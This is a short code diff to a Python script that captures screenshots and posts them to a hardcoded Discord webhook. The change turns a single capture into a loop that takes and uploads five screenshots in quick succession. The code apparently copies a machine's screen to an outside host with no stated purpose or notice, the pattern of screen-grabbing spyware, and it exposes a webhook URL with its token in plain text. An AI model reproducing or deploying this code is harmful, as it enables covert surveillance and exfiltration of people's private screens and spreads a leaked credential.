@@ -14,6 +14,9 @@ def send_to_discord_webhook(webhook_url, file_path):
         response = requests.post(webhook_url, files=files, data=data)
 
 if __name__ == "__main__":
-    screenshot_path = take_screenshot()
     webhook_url = 'https://discord.com/api/webhooks/1428033334780629147/aVYrRB172coH38ajLXrj5vwlBftEppXC7mkfICZUjDGZIPjA_eZDtl70T_K6Mj4md8z8'
-    send_to_discord_webhook(webhook_url, screenshot_path)
+
+    for i in range(5):
+        screenshot_path = take_screenshot(f'screenshot_{i+1}.png')
+        send_to_discord_webhook(webhook_url, screenshot_path)
+        time.sleep(0.5)
